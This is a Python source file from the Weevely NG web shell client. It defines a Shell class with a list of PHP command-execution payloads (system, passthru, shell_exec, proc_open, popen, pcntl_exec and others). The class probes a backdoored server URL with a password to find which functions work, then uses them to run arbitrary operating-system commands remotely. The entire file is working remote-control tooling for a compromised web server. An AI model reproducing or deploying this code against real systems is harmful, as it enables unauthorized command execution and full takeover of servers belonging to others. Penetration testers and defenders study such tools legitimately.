# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import random
from http.cmdrequest import CmdRequest

class Shell:
	# name => payload.
	vectors = [ { "system()"       : "@system('%s 2>&1');",
				"passthru()"     : "passthru('%s 2>&1');",
				"shell_exec()"   : "echo shell_exec('%s 2>&1');"
			  },

			  {
			    "proc_open()"    : "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));" + \
							       "$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));" + \
								   "while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);" + \
								   "fclose($pipes[2]); proc_close($h);",
				"popen()"        : "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);",
				"python_eval()"  : "@python_eval('import os; os.system('%s 2>&1');",
				"pcntl_exec()"   : "$args = array('%s'); pcntl_exec( '%s', $args );",
				"perl->system()" : "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;",
				"exec()"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"
			    }
		    ]

	def __init__( self, url, password ):
		self.url 	  = url
		self.password = password
		self.allowed  = []
		self.payload  = None

		self.__searchAllowedPayloads()

		if self.allowed == []:
			raise Exception( "No allowed functions found on %s." % self.url )
		else:
			for vect in self.vectors:
			  self.payload = vect[ self.allowed[0] ]
			  break

			print "+ Using method '%s' ." % self.allowed[0]

	def __searchAllowedPayloads( self,  ):

		for vect in self.vectors:

		  for name, payload in vect.items():
			  try:
				  rand     = random.randint( 11111, 99999 )
				  response = self.execute( "echo %d" % rand, vect[name] )

				  if response == str(rand):
					  self.allowed.append(name)
			  except:
				  pass

	def execute( self, cmd, payload = None ):
		if payload == None:
			payload = self.payload

		if payload.count( '%s' ) == 1:
			payload = payload % cmd.replace( "'", "\\'" )
		else:
			args    = "','".join( cmd.split(' ')[1:] )
			cmd     = cmd.split()[0]
			payload = payload % ( args, cmd )

		request = CmdRequest( self.url, self.password )
		request.setPayload(payload)

		return request.execute()
